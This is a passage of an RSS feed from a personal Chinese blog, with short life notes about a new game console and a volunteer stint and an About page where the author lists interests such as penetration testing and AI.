+0000</pubDate></item><item><title>生活随笔(三)</title><link>https://ClaudeRead.github.io/post/sheng-huo-sui-bi-%28-san-%29.html</link><description>&amp;emsp;&amp;emsp;最近入手了一台XSS，人生的第一台主机，不得不说是真滴香🐮🐮🐮🐮🐮🐮。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/sheng-huo-sui-bi-%28-san-%29.html</guid><pubDate>Sat, 16 Mar 2019 04:12:00 +0000</pubDate></item><item><title>生活随笔(一)</title><link>https://ClaudeRead.github.io/post/sheng-huo-sui-bi-%28-yi-%29.html</link><description>将近一个月的志愿活动结束了，总结一句话“痛并快乐着”(～￣▽￣)～在不同岗位体验不一样的志愿服务，帮助更多需要帮助的人。</description><guid isPermaLink="true">https://ClaudeRead.github.io/post/sheng-huo-sui-bi-%28-yi-%29.html</guid><pubDate>Sat, 01 Dec 2018 00:53:00 +0000</pubDate></item><item><title>关于</title><link>https://ClaudeRead.github.io/about.html</link><description>### 👋 嗨，你好呀！
+
+欢迎来到我的小站！这里是我在互联网上的一方小天地 🌿
+---
+
+### 🎯 关于我
+
+一个网络名称瞎起，科技树乱点、只会拆不会装、喜欢东瞅瞅西看看、臭打游戏的乙方崽 💻
+
+- 🔭 目前正在学习和探索：渗透测试、应急响应、数据合规、AI.........
+- 🌱 正在成长的路上，不断学习新知识
+- 💬 喜欢分享技术心得和生活感悟
+- 📚 热爱阅读，偶尔写写文章
+- 🎮 闲暇时喜欢打游戏、听音乐、看电影
+---
+
+### 🎨 关于这个博客
+
+这个博客使用 **Gmeek** 搭建，基于 GitHub Issues，简洁又高效 (疯狂安利！！！)✨
+
+- 📝 所有文章都写在 Issues 里
+- 🎨 主题简洁清新，专注于内容
+- 🚀 部署在 GitHub Pages，免费又稳定
+- 💡 支持评论、搜索、标签等功能
+
+博客主要用于记录：
+- 🔧 技术学习笔记
+- 💭 生活感悟与思考
+- 📚 读书心得与书评
+- 🎮 兴趣爱好分享
+---
+
+### ✨ 座右铭
+
+&gt; 生活不止眼前的代码，还有诗和远方 🌈
+
+---
+
+
+*感谢你的访问！希望你能在这个AI时代留下属于自己独属的印记 😊**
+
+&lt;!-- ##{'timestamp':1771992720}## --&gt;。</description><guid isPermaLink="true">https://ClaudeRead.github.io/about.html</guid><pubDate>Fri, 20 Mar 2026 03:00:32 +0000</pubDate></item></channel></rss>
